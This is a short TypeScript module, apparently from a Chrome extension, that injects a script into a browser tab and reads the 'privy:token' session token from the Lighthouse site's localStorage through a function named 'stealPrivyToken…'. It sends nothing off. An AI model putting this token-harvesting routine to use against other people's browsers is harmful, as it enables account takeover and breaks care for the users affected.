export interface Tokens {
  privyToken?: string;
}

function getTokensFromLighthouseLocalStorage(): Tokens {
  const privyToken = window.localStorage.getItem("privy:token");
  return {
    privyToken: privyToken ? (JSON.parse(privyToken) as string) : undefined,
  };
}

export async function stealPrivyTokenFromLighthouseLocalStorage(tabId: number): Promise<string | undefined> {
  const [{ result }] = await chrome.scripting.executeScript({
    target: { tabId },
    func: getTokensFromLighthouseLocalStorage,
  });

  console.log(`Found a token: ${String(!!result.privyToken)}`);
  return result.privyToken;
}
